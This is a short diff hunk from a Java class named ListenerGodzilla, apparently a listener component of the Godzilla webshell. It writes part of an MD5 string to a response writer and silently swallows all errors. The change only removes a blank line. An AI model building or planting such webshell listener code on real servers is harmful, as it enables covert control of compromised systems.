@@ -74,7 +74,6 @@ public class ListenerGodzilla implements InvocationHandler {
                 invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{md5.substring(16)});
             }
         } catch (Throwable e) {
-
         }
     }
 
